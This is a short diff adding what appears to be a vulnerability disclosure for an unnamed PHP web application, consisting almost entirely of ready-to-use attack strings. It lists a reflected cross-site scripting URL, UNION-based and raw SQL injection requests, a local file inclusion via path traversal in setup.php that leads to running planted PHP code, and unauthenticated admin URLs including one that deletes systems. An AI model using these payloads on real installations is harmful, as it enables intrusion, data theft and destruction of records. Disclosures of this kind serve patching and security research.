@@ -1,0 +1,26 @@
+Cross-site scripting
+
+list.php?view=%3Cscript%3Ealert('XSS')%3B%3C%2Fscript%3E
+
+
+SQL injection
+
+admin_config_data.php?sub=f8&ldap_path_id=1%20UNION%20SELECT%20user%28%29,%20database%28%29
+
+list_export.php?filename=export&sql=SELECT%2B%252A%2BFROM%2B%2560system
+
+
+Local file include
+
+Create a file named /tmp/test containing some php code. Send a POST request to
+setup.php with the following parameters :
+ 
+    - language = %2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2ftest
+    - step = 2
+
+
+Authentication bypass:
+
+admin_config_data.php?sub=f1
+
+delete_system.php?pc=<ID>
